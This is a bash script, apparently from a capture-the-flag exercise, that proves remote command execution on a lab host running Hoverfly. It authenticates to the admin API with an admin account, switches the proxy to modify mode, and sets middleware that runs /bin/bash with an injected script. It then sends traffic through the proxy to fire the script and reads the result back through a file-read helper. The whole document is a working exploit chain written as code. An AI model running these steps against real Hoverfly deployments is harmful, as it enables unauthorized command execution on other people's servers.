#!/usr/bin/env bash
set -u
OUT="/home/ctf/ctf/proof_hoverfly_output.txt"
: > "$OUT"

run_cmd() {
  {
    echo "============================================================"
    echo "$ $*"
    echo "------------------------------------------------------------"
  } >> "$OUT"
  "$@" >> "$OUT" 2>&1
  local ec=$?
  echo "[exit_code]=$ec" >> "$OUT"
  echo >> "$OUT"
}

run_cmd curl -sS -i -X POST http://devarea.htb:8888/api/token-auth -H "Content-Type: application/json" -d '{"username":"admin","password":"<REDACTED>"}'

TOKEN=$(curl -sS -X POST http://devarea.htb:8888/api/token-auth -H "Content-Type: application/json" -d '{"username":"admin","password":"<REDACTED>"}' | python3 -c 'import sys,json; print(json.load(sys.stdin)["token"])')
{
  echo "============================================================"
  echo '$ TOKEN=<parsed from /api/token-auth response>'
  echo "------------------------------------------------------------"
  echo "TOKEN_LENGTH=${#TOKEN}"
  echo "[exit_code]=0"
  echo
} >> "$OUT"

run_cmd curl -sS -i -X PUT http://devarea.htb:8888/api/v2/hoverfly/mode -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"mode":"modify"}'
run_cmd curl -sS -i -X PUT http://devarea.htb:8888/api/v2/hoverfly/middleware -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d '{"binary":"/bin/bash","script":"echo HOVERFLY_RCE_OK > /tmp/hf_mw_test"}'
run_cmd bash -lc "curl -sS --max-time 12 -x http://devarea.htb:8500 -U admin:<HOVERFLY_ADMIN_PASSWORD_REDACTED> http://example.com >/dev/null || true"
run_cmd bash -lc "python3 /home/ctf/ctf/xop_read.py file:///tmp/hf_mw_test --timeout 20 | sed -n '1,80p'"

echo "Hoverfly proof complete: $OUT"
